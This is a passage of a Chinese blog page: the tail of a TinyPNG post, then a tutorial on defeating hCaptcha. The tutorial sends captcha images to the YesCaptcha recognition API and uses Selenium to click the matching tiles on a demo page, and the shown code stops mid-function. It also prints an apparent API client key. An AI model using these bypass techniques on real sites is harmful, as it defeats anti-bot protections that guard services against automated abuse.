                  <h2 id="支持-APNG-吗？"><a href="#支持-APNG-吗？" class="headerlink" title="支持 APNG 吗？"></a>支持 APNG 吗？</h2>
                  <p>不知道大家有没有听说过一种 PNG 图片格式，叫做 APNG，其实就是 Animated PNG，就是可以动的 PNG 图片，比如这张图片：<a href="https://ezgif.com/images/apng.png" target="_blank" rel="noopener" title="https://ezgif.com/images/apng.png">https://ezgif.com/images/apng.png</a></p>
                  <p>大家可以打开看看效果。</p>
                  <p>对于这种图片，现在主流的浏览器也都支持显示了，如果你的浏览器支持，那么能看到这张图片是动的。</p>
                  <p>TinyPNG 对 APNG 这种格式也是支持的！</p>
                  <h2 id="对于-PS-的支持"><a href="#对于-PS-的支持" class="headerlink" title="对于 PS 的支持"></a>对于 PS 的支持</h2>
                  <p>TinyPNG 也提供了 PS 的插件，安装之后我们也可以在 PS 里面直接使用 TinyPNG 了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/kvjs2.png" alt=""></p>
                  <p>这个插件适用于 PS 的 CS5、CS6、CC2013-2022 所有版本。</p>
                  <p>具体大家可以看 <a href="https://tinypng.com/photoshop" target="_blank" rel="noopener" title="https://tinypng.com/photoshop">https://tinypng.com/photoshop</a></p>
                  <p>不过坏消息是，这个插件是收费的，大家按需上车。</p>
                  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
                  <p>好了，以上就是本文章全部内容了，希望对大家有帮助。</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-06-03 18:27:13" itemprop="dateCreated datePublished" datetime="2022-06-03T18:27:13+08:00">2022-06-03</time>
                </span>
                <span id="/36061.html" class="post-meta-item leancloud_visitors" data-flag-title="推荐一个超强的图片压缩网站！" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.1k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36060.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 爬虫 <i class="label-arrow"></i>
                  </a>
                  <a href="/36060.html" class="post-title-link" itemprop="url">HCaptcha的模拟点击破解教程来了！</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>前面的文章我们介绍过 ReCaptcha 的模拟点击破解教程，但除了 ReCaptcha，还有另外和 ReCapacha 验证流程很相似的验证码，叫做 HCaptcha。</p>
                  <p>ReCaptcha 是谷歌家的，因为某些原因，咱们国内是无法使用 ReCaptcha 的，所以有时候 HCaptcha 也成了一些国际性网站的比较好的选择。</p>
                  <p>那今天我们就来了解下 HCaptcha 和它的模拟点击破解流程。</p>
                  <h2 id="HCaptcha"><a href="#HCaptcha" class="headerlink" title="HCaptcha"></a>HCaptcha</h2>
                  <p>我们首先看看 HCaptcha 的验证交互流程，其 Demo 网站为 <a href="https://democaptcha.com/demo-form-eng/hcaptcha.html" target="_blank" rel="noopener" title="https://democaptcha.com/demo-form-eng/hcaptcha.html">https://democaptcha.com/demo-form-eng/hcaptcha.html</a>，打开之后，我们可以看到如下的验证码入口页面：</p>
                  <p><img src="https://cdn.cuiqingcai.com/i3g6q.png" alt=""></p>
                  <p>看起来入口和 ReCaptcha 很相似的对吧，其实验证流程也是很类似的。</p>
                  <p>当我们点击复选框时，验证码会先通过其风险分析引擎判断当前用户的风险，如果是低风险用户，便可以直接通过，反之，验证码会弹出对话框，让我们回答对话框中的问题，类似如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/x94ez.png" alt=""></p>
                  <p>这时候我们看到 HCaptcha 验证码会给我们一个问题，比如上图的问题是「请点击每张包含飞机的图片」，我们需要从下面的九张图中选择出含有飞机的图片，如果九张图片中，没有飞机，则点击「跳过 / Skip」按钮，如果有，则将所有带有飞机的图片都选择上，跳过按钮会变成「检查 / Verify」按钮，验证通过之后我们就可以看到如下的验证成功的效果了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/8ncsk.png" alt=""></p>
                  <p>是不是整体流程和 ReCaptcha 还是还是非常相近的？</p>
                  <p>但其实这个比 ReCaptcha 简单一些，它的验证码图片每次一定是 3x3 的，没有 4x4 的，而且点击一个图之后不会再出现一个新的小图让我们二次选择，所以其破解思路也相对简单一些。</p>
                  <h2 id="如何破解"><a href="#如何破解" class="headerlink" title="如何破解"></a>如何破解</h2>
                  <p>整个流程其实我们稍微梳理下，就知道整体的的破解思路了，有这么两个关键点：</p>
                  <ul>
                    <li>
                      <p>第一就是把上面的文字内容找出来，以便于我们知道要点击的内容是什么。</p>
                    </li>
                    <li>
                      <p>第二就是我们要知道哪些目标图片和上面的文字是匹配的，找到了依次模拟点击就好了。</p>
                    </li>
                  </ul>
                  <p>听起来似乎很简单的对吧，但第二点是一个难点，我们咋知道哪些图片和文字匹配的呢？这就是一个难题。</p>
                  <p>前面 ReCaptcha 的破解过程我们了解过了使用 YesCaptcha 来进行图片的识别，除了 ReCaptcha，YesCaptcha 其实也支持 HCaptcha 的验证码识别，利用 YesCaptcha 我们也能轻松知道哪些图片和输入内容是匹配的。</p>
                  <p>下面让们来试试看。</p>
                  <h2 id="YesCaptcha"><a href="#YesCaptcha" class="headerlink" title="YesCaptcha"></a>YesCaptcha</h2>
                  <p>在使用之前我们需要先注册下这个网站，网站地址是 <a href="https://yescaptcha.com/i/CnZPBu" target="_blank" rel="noopener" title="https://yescaptcha.com/i/CnZPBu">https://yescaptcha.com/i/CnZPBu</a> ，注册个账号之后大家可以在后台获取一个账户密钥，也就是 ClientKey，保存备用。</p>
                  <p><img src="https://cdn.cuiqingcai.com/vs5pl.png" alt=""></p>
                  <p>OK，然后我们可以查看下这里的官方文档：<a href="https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/24543233/HCaptchaClassification+Hcaptcha" target="_blank" rel="noopener" title="https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/24543233/HCaptchaClassification+Hcaptcha">https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/24543233/HCaptchaClassification+Hcaptcha</a>，这里介绍介绍了一个 API，大致内容是这样的。</p>
                  <p>首先有一个创建任务的 API，API 地址为 <a href="https://api.yescaptcha.com/createTask" target="_blank" rel="noopener" title="https://api.yescaptcha.com/createTask">https://api.yescaptcha.com/createTask</a>，然后看下请求参数：</p>
                  <p><img src="https://cdn.cuiqingcai.com/xpyre.png" alt=""></p>
                  <p>这里我们需要传入这么几个参数：</p>
                  <ul>
                    <li>
                      <p>type：内容就是 ****</p>
                    </li>
                    <li>
                      <p>queries：是验证码对应的 Base64 编码，这里直接转成一个列表就可以</p>
                    </li>
                    <li>
                      <p>question：对应的问题 ID，也就是识别目标的代号，这里其实就是问题整句的内容</p>
                    </li>
                    <li>
                      <p>corrdinate：一个返回结果的控制开关，默认会返回每张图片识别的 true / false 结果，也就是第 x 张图片是否和图片匹配，如果加上该参数，那么 API 就会返回对应匹配图片的索引。</p>
                    </li>
                  </ul>
                  <p>比如这里我们可以 POST 这样的一个内容给服务器，结构如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"clientKey"</span>: <span class="string">"cc9c18d3e263515c2c072b36a7125eecc078618f"</span>,</span><br><span class="line">    <span class="attr">"task"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"HCaptchaClassification"</span>,</span><br><span class="line">        <span class="attr">"queries"</span>: [</span><br><span class="line">            <span class="string">"/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8Uw..."</span>,</span><br><span class="line">            <span class="string">"/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8Uw..."</span>,</span><br><span class="line">            ...</span><br><span class="line">            <span class="string">"/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8Uw..."</span>,</span><br><span class="line">    ],</span><br><span class="line">        <span class="attr">"question"</span>: <span class="string">"请单击每个包含卡车的图像。"</span> <span class="comment">// 直接上传问题整句</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后服务器就会返回类似这样的响应：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errorId"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"errorCode"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"status"</span>: <span class="string">"ready"</span>,</span><br><span class="line">    <span class="attr">"solution"</span>: &#123;</span><br><span class="line">        <span class="attr">"objects"</span>: [<span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">true</span>] <span class="comment">// 返回图片是否为目标,</span></span><br><span class="line">        <span class="string">"labels"</span>: [<span class="string">"truck"</span>, <span class="string">"boat"</span>, <span class="string">"boat"</span>, <span class="string">"truck"</span>, <span class="string">"truck"</span>, <span class="string">"airplane-right"</span>, <span class="string">"truck"</span>, <span class="string">"truck"</span>] <span class="comment">// 返回图片对应的标签</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"taskId"</span>: <span class="string">"5aa8be0c-94a5-11ec-80d7-00163f00a53c"</span><span class="string">"</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>OK，我们可以看到，返回结果的 solution 字段中的 objects 字段就包含了一串 true 和 false 的列表，这就代表了每张图片是否和目标匹配。</p>
                  <p>知道了这个结果之后，我们只需要将返回结果为 true 的图片进行模拟点击就好了。</p>
                  <h2 id="代码基础实现"><a href="#代码基础实现" class="headerlink" title="代码基础实现"></a>代码基础实现</h2>
                  <p>行，那有了基本思路之后，那我们就开始用 Python 实现下整个流程吧，这里我们就拿 <a href="https://democaptcha.com/demo-form-eng/hcaptcha.html" target="_blank" rel="noopener" title="https://democaptcha.com/demo-form-eng/hcaptcha.html">https://democaptcha.com/demo-form-eng/hcaptcha.html</a> 这个网站作为样例来讲解下整个识别和模拟点击过程。</p>
                  <h3 id="识别封装"><a href="#识别封装" class="headerlink" title="识别封装"></a>识别封装</h3>
                  <p>首先我们对上面的任务 API 实现一下封装，来先写一个类：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> app.settings <span class="keyword">import</span> CAPTCHA_RESOLVER_API_KEY, CAPTCHA_RESOLVER_API_URL</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaptchaResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, api_url=CAPTCHA_RESOLVER_API_URL, api_key=CAPTCHA_RESOLVER_API_KEY)</span>:</span></span><br><span class="line">        self.api_url = api_url</span><br><span class="line">        self.api_key = api_key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_task</span><span class="params">(self, queries, question)</span>:</span></span><br><span class="line">        logger.debug(<span class="string">f'start to recognize image for question <span class="subst">&#123;question&#125;</span>'</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"clientKey"</span>: self.api_key,</span><br><span class="line">            <span class="string">"task"</span>: &#123;</span><br><span class="line">                <span class="string">"type"</span>: <span class="string">"HCaptchaClassification"</span>,</span><br><span class="line">                <span class="string">"queries"</span>: queries,</span><br><span class="line">                <span class="string">"question"</span>: question</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(self.api_url, json=data)</span><br><span class="line">            result = response.json()</span><br><span class="line">            logger.debug(<span class="string">f'captcha recogize result <span class="subst">&#123;result&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException:</span><br><span class="line">            logger.exception(</span><br><span class="line">                <span class="string">'error occurred while recognizing captcha'</span>, exc_info=<span class="literal">True</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>OK，这里我们就先定义了一个类 CaptchaResolver，然后主要接收两个参数，一个就是 <code>api_url</code>，这个对应的就是 <a href="https://api.yescaptcha.com/createTask" target="_blank" rel="noopener" title="https://api.yescaptcha.com/createTask">https://api.yescaptcha.com/createTask</a> 这个 API 地址，然后还有一个参数是 <code>api_key</code>，这个就是前文介绍的那个 ClientKey。</p>
                  <p>接着我们定义了一个 create_task 方法，接收两个参数，第一个参数 queries 就是每张验证码图片对应的 Base64 编码，第二个参数 <code>question</code> 就是要识别的问题整句，这里就是将整个请求用 requests 模拟实现了，最后返回对应的 JSON 内容的响应结果就好了。</p>
                  <h3 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h3>
                  <p>OK，那么接下来我们来用 Selenium 来模拟打开这个实例网站，然后模拟点选来触发验证码，接着识别验证码就好了。</p>
                  <p>首先写一个大致框架：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.remote.webelement <span class="keyword">import</span> WebElement</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> app.captcha_resolver <span class="keyword">import</span> CaptchaResolver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.browser = webdriver.Chrome()</span><br><span class="line">        self.browser.get(url)</span><br><span class="line">        self.wait = WebDriverWait(self.browser, <span class="number">10</span>)</span><br><span class="line">        self.captcha_resolver = CaptchaResolver()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        self.browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们先在构造方法里面初始化了一个 Chrome 浏览器操作对象，然后调用对应的 get 方法打开实例网站，接着声明了一个 WebDriverWait 对象和 CaptchaResolver 对象，以分别应对节点查找和验证码识别操作，留作备用。</p>
                  <h3 id="iframe-切换支持"><a href="#iframe-切换支持" class="headerlink" title="iframe 切换支持"></a>iframe 切换支持</h3>
                  <p>接着，下一步我们就该来模拟点击验证码的入口，来触发验证码了对吧。</p>
                  <p>通过观察我们发现这个验证码和 ReCaptcha 非常类似，其入口其实是在 iframe 里面加载的，对应的 iframe 是这样的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/0ynna.png" alt=""></p>
                  <p>另外弹出的验证码图片又在另外一个 iframe 里面，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/64976.png" alt=""></p>
                  <p>Selenium 查找节点是需要切换到对应的 iframe 里面才行的，不然是没法查到对应的节点，也就没法模拟点击什么的了。</p>
                  <p>所以这里我们定义几个工具方法，分别能够支持切换到入口对应的 iframe 和验证码本身对应的 iframe，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_entry_iframe</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    self.browser.switch_to.default_content()</span><br><span class="line">    captcha_entry_iframe = self.browser.find_element_by_css_selector(</span><br><span class="line">        <span class="string">'.h-captcha &gt; iframe'</span>)</span><br><span class="line">    <span class="keyword">return</span> captcha_entry_iframe</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_to_captcha_entry_iframe</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    captcha_entry_iframe: WebElement = self.get_captcha_entry_iframe()</span><br><span class="line">    self.browser.switch_to.frame(captcha_entry_iframe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_content_iframe</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    self.browser.switch_to.default_content()</span><br><span class="line">    captcha_content_iframe = self.browser.find_element_by_xpath(</span><br><span class="line">        <span class="string">'//iframe[contains(@title, "Main content")]'</span>)</span><br><span class="line">    <span class="keyword">return</span> captcha_content_iframe</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_to_captcha_content_iframe</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    captcha_content_iframe: WebElement = self.get_captcha_content_iframe()</span><br><span class="line">    self.browser.switch_to.frame(captcha_content_iframe)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样的话，我们只需要调用 switch_to_captcha_content_iframe 就能查找验证码图片里面的内容，调用 switch_to_captcha_entry_iframe 就能查找验证码入口里面的内容。</p>
                  <h3 id="触发验证码"><a href="#触发验证码" class="headerlink" title="触发验证码"></a>触发验证码</h3>
                  <p>OK，那么接下来的一步就是来模拟点击验证码的入口，然后把验证码触发出来了对吧，就是模拟点击这里：</p>
                  <p><img src="https://cdn.cuiqingcai.com/31szt.png" alt=""></p>
                  <p>实现很简单，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_captcha</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    self.switch_to_captcha_entry_iframe()</span><br><span class="line">    captcha_entry = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'#anchor #checkbox'</span>)))</span><br><span class="line">    captcha_entry.click()</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    self.switch_to_captcha_content_iframe()</span><br><span class="line">    captcha_element: WebElement = self.get_captcha_element()</span><br><span class="line">    <span class="keyword">if</span> captcha_element.is_displayed:</span><br><span class="line">        logger.debug(<span class="string">'trigged captcha successfully'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里首先我们首先调用 switch_to_captcha_entry_iframe 进行了 iframe 的切换，然后找到那个入口框对应的节点，然后点击一下。</p>
                  <p>点击完了之后我们再调用 switch_to_captcha_content_iframe 切换到验证码本身对应的 iframe 里面，查找验证码本身对应的节点是否加载出来了，如果加载出来了，那么就证明触发成功了。</p>
                  <h3 id="找出识别目标"><a href="#找出识别目标" class="headerlink" title="找出识别目标"></a>找出识别目标</h3>
                  <p>OK，那么现在验证码可能就长这样子了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/n0dij.png" alt=""></p>
                  <p>那接下来我们要做的就是两件事了，一件事就是把匹配目标，也就是问题本身找出来，第二件事就是把每张验证码保存下来，然后转成 Base64 编码。</p>
                  <p>好，那么怎么查找问题呢呢？用 Selenium 常规的节点搜索就好了：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_target_text</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    captcha_target_name_element: WebElement = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'.prompt-text'</span>)))</span><br><span class="line">    <span class="keyword">return</span> captcha_target_name_element.text</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>通过调用这个方法，我们就能得到上图中完整的问题文本了。</p>
                  <h2 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h2>
                  <p>接下来，我们就需要把每张图片进行下载并转成 Base64 编码了，我们观察下它的 HTML 结构：</p>
                  <p><img src="https://cdn.cuiqingcai.com/f21kb.png" alt=""></p>
                  <p>我们可以看到，每个验证码其实都对应了一个 <code>.task-image</code> 的节点，然后里面有个 <code>.image-wrapper</code> 的节点，在里面有一个 <code>.image</code> 的节点，那图片怎么呈现的呢？这里它是设置了一个 style CSS 样式，通过 CSS 的 <code>backgroud</code> 来设置了验证码图片的地址。</p>
                  <p>所以，我们要想提取验证码图片也比较容易了，我们只需要找出 <code>.image</code> 节点的 style 属性的内容，然后提取其中的 url 就好了。</p>
                  <p>得到 URL 之后，转下 Base64 编码，利用 captcha_resolver 就可以对内容进行识别了。</p>
                  <p>所以代码可以写为如下内容：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_captcha</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># get target text</span></span><br><span class="line">    self.captcha_target_text = self.get_captcha_target_text()</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'captcha_target_text <span class="subst">&#123;self.captcha_target_text&#125;</span>'</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># extract all images</span></span><br><span class="line">    single_captcha_elements = self.wait.until(EC.visibility_of_all_elements_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'.task-image .image-wrapper .image'</span>)))</span><br><span class="line">    resized_single_captcha_base64_strings = []</span><br><span class="line">    <span class="keyword">for</span> i, single_captcha_element <span class="keyword">in</span> enumerate(single_captcha_elements):</span><br><span class="line">        single_captcha_element_style = single_captcha_element.get_attribute(</span><br><span class="line">            <span class="string">'style'</span>)</span><br><span class="line">        pattern = re.compile(<span class="string">'url\("(https.*?)"\)'</span>)</span><br><span class="line">        match_result = re.search(pattern, single_captcha_element_style)</span><br><span class="line">        single_captcha_element_url = match_result.group(</span><br><span class="line">            <span class="number">1</span>) <span class="keyword">if</span> match_result <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        logger.debug(</span><br><span class="line">            <span class="string">f'single_captcha_element_url <span class="subst">&#123;single_captcha_element_url&#125;</span>'</span>)</span><br><span class="line">        <span class="keyword">with</span> open(CAPTCHA_SINGLE_IMAGE_FILE_PATH % (i,), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(requests.get(single_captcha_element_url).content)</span><br><span class="line">        resized_single_captcha_base64_string = resize_base64_image(</span><br><span class="line">            CAPTCHA_SINGLE_IMAGE_FILE_PATH % (i,), (<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line">        resized_single_captcha_base64_strings.append(</span><br><span class="line">            resized_single_captcha_base64_string)</span><br><span class="line"></span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'length of single_captcha_element_urls <span class="subst">&#123;len(resized_single_captcha_base64_strings)&#125;</span>'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们提取出来了每张验证码图片的 url，这里是用正则表达式进行批评的，提取出 url 之后，我们然后将其存入了 resized_single_captcha_base64_strings 列表里面。</p>
                  <p>其中这里的 Base64 编码我们单独定义了一个方法，传入了图片路径和调整大小，然后可以返回编码后的结果，定义如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
